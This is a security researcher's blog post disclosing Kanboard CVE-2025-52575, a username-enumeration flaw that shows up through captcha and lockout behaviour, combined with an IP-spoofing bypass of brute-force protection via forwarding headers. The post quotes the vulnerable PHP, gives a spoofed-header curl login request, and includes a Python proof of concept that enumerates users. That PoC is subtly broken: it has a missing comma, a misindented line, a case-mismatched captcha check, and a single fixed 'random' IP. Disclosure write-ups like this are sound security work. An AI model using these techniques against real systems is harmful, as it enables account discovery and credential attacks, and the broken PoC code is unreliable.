---
layout: post
title: "Kanboard CVE-2025-52575"
category: cve
tags: [kanboard, cve-2025-52575, security]
cvss_score: 5.3
cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"

---

<style>
/* Only affects this post */
pre {
  margin-top: 2em;
  margin-bottom: 2em !important;
  padding: 1em;
  border-radius: 6px;
}
ol {
  margin-bottom: 2em;
}

ol > li {
  margin-bottom: 1em;  /* space between list items */
  line-height: 1;
}
</style>

## Username Enumeration via Login and Bruteforce Protection Bypass

{% if page.cvss_score %}
  {% include cvss.html score=page.cvss_score vector=page.cvss_vector %}
{% endif %}

### Identifying the Vulnerability

So previously I made a [post](/posts/kanboard_password.html) about a security flaw in Kanboard regarding password reset poisoning by abusing the `Host` headers.  

In light of this, I decided to continue this approach of finding places where headers may potentially be misused. A logical candidate for this is login and authentication. 

#### Username Enumeration

Most developers these days are aware of the fact that verbose errors on login failures are a bad idea.  If on login failure a valid user's error displays `Invalid password` whereas an invalid user displays `No such user`, an attacker can easily enumerate through a list of usernames and see which are valid and which aren't, which can cause a host of problems.

The developers at Kanboard are obviously aware of this and do a good job of returning vague error messages on login failures. However when going through the source code of the login flow I found that they overlooked an important detail.

First let's take a look at `kanboard/app/Model/UserLockingModel.php`

```php
 public function hasCaptcha($username, $tries = BRUTEFORCE_CAPTCHA) 
 { 
     return $this->getFailedLogin($username) >= $tries; 
 } 
```

In this case a Captcha will be shown on login if the failed tries for a username >= some threshold (default is 3). Obviously there's a mechanism somewhere for keeping track of usernames and login tries, which I found in `kanboard/app/Subscriber/AuthSubscriber.php`:

```php
 $this->logger->debug('Subscriber executed: '.__METHOD__); 
 $username = $event->getUsername(); 
 $ipAddress = $this->request->getIpAddress(); 
  
 if (! empty($username)) { 
     // log login failure in web server log to allow fail2ban usage 
     error_log('Kanboard: user '.$username.' authentication failure with IP address: '.$ipAddress); 
     $this->userLockingModel->incrementFailedLogin($username); 
  
     if ($this->userLockingModel->getFailedLogin($username) > BRUTEFORCE_LOCKDOWN) { 
         $this->userLockingModel->lock($username, BRUTEFORCE_LOCKDOWN_DURATION); 
     } 
 }
```

Do you see the logic flaw in here? It comes from `if( ! empty(username) )`. Failed login counts are only increased if the username exists.  This means that invalid users will never see a captcha, whereas valid users will see one after three attempts! In other words it's very simple to enumerate all users in the app in a similar way to that of the error messaging example -- just try to login 3 times and see if a Captcha pops up.

Notice too from the code above that an attacker could also use account locking to infer the same thing (although it would be less stealthy).

#### Bruteforce Protection Bypass
While usernames can be enumerated, I noticed that in the `AuthSubscriber` method above that IP addresses were being logged to fail2ban.  

```php
 $this->logger->debug('Subscriber executed: '.__METHOD__); 
 $username = $event->getUsername(); 
 $ipAddress = $this->request->getIpAddress(); 
  
 if (! empty($username)) { 
     // log login failure in web server log to allow fail2ban usage 
     error_log('Kanboard: user '.$username.' authentication failure with IP address: '.$ipAddress); 
```

This means that too many failed login attempts could lead to an IP being banned for a period of time.  I started to look for a way around this, and was curious as to the how the app was determining the IP address at login time.

A quick search took me to `kanboard/app/Core/Http/Request.php`

```php
 public function getIpAddress() 
 { 
     $keys = array( 
         'HTTP_X_REAL_IP', 
         'HTTP_CLIENT_IP', 
         'HTTP_X_FORWARDED_FOR', 
         'HTTP_X_FORWARDED', 
         'HTTP_X_CLUSTER_CLIENT_IP', 
         'HTTP_FORWARDED_FOR', 
         'HTTP_FORWARDED', 
         'REMOTE_ADDR' 
     ); 
  
     foreach ($keys as $key) { 
         if ($this->getServerVariable($key) !== '') { 
             foreach (explode(',', $this->server[$key]) as $ipAddress) { 
                 return trim($ipAddress); 
             } 
         } 
     } 
  
     return t('Unknown'); 
 } 
```

Like the vulnerability for [Password Reset Poisoning](/posts/kanboard_password.html), it appears that the app is just blinding trusting user supplied headers to get the IP value, perfect for IP spoofing. 

Using this knowledge, an attacker could supply one of the header values above (`HTTP-X-Forwarded-For`) using a different IP address per request, rendering fail2ban or other IP-based mechanisms completely useless.

This vulnerability, combined with the username enumeration bug above, means that an attacker could use IP-spoofing to bruteforce enumerate all users in the app in a very short amount of time.


### Exploiting

The exploit for the username enumeration is trivial.  Go to the login page and fail to login 3 times with a valid user.  You should then see a captcha pop up:


<figure style="text-align: center; margin: 2em 0;">
  <img src="/assets/img/kanboard/capcha.png" alt="Captcha" style="display: block; margin-left: auto; margin-right: auto; max-width: 90%; border-radius: 8px;">
</figure>

Now try with an invalid user:

<figure style="text-align: center; margin: 2em 0;">
  <img src="/assets/img/kanboard/nocapcha.png" alt="Captcha" style="display: block; margin-left: auto; margin-right: auto; max-width: 90%; border-radius: 8px;">
</figure>

For the brute-force bypass, I won't go into depth setting it up, but here's an example using curl and an `HTTP-X-Forwarded-For` header to spoof the IP address.

```
curl --path-as-is -i -s -k -X $'POST' \
    -H $'HTTP-X-Forwarded-For: 1.2.3.4' -H $'Host: localhost' \
    --data-binary $'csrf_token=5086860f64f9c14dc7d798cbb354929c6389e088cc4144eb261cfea70a883e59&username=asdfasdfdsfasdf&password=asdfasdfdsfsdfasf&remember_me=1' \
    $'http://localhost/?controller=AuthController&action=check'
```

### PoC
Here's a proof of concept in python to enumerate all users. It also incorporates IP-spoofing to bypass any bruteforce protections.

```python
import requests
import re
import sys
from pathlib import Path
import random

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def extract_csrf(html):
    match = re.search(r'name="csrf_token"\s+value="([a-f0-9]{64})"', html)
    return match.group(1) if match else None

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <url> <userfile> <hostname>")
        sys.exit(1)

    url = sys.argv[1]
    userfile = Path(sys.argv[2])
    hostname = sys.argv[3] if len(sys.argv) == 4 else 'localhost'

    if not userfile.is_file():
        print(f"[!] User file not found: {userfile}")
        sys.exit(1)

    session = requests.Session()
    headers_get = {
        "Host": hostname
    }
    headers_post = {
        "HTTP-X-Forwarded-For": random_ip(), # Spoof IP Address
        "Host": hostname
        "Content-Type": "application/x-www-form-urlencoded"
    }

    for username in userfile.read_text().splitlines():
        try:
            for i in range(0,3): # Need 3 failures to trigger
                # Step 1: Get CSRF token
                r = session.get(url, headers=headers_get)
                csrf_token = extract_csrf(r.text)
                if not csrf_token:
                    print(f"[{username}] Failed to extract CSRF token")
                    continue

                # Step 2: POST login
                payload = {
                    "csrf_token": csrf_token,
                    "username": username,
                    "password": "invalidpassword",
                    "remember_me": "1"
                }
                    resp = session.post(url, headers=headers_post, data=payload)

                # Step 3: Check for CAPTCHA
                if "Enter the text below" in resp.text.lower():
                    print(f"Found user: {username}")
        except Exception as e:
            print(f"[{username}] Error: {e}")

if __name__ == "__main__":
    main()
```

### Final Thoughts
This post again shows why it's not a good idea to trust user-supplied header values.  Additionally, it's not just error messages that can lead to user enumeration. Behaviors like CAPTCHA popups or redirects are another way attackers can probe for valid users.


Note that this has been patched and a security advisory has been published here: [GHSA-qw57-7cx6-wvp7 advisory](https://github.com/kanboard/kanboard/security/advisories/GHSA-qw57-7cx6-wvp7)
 
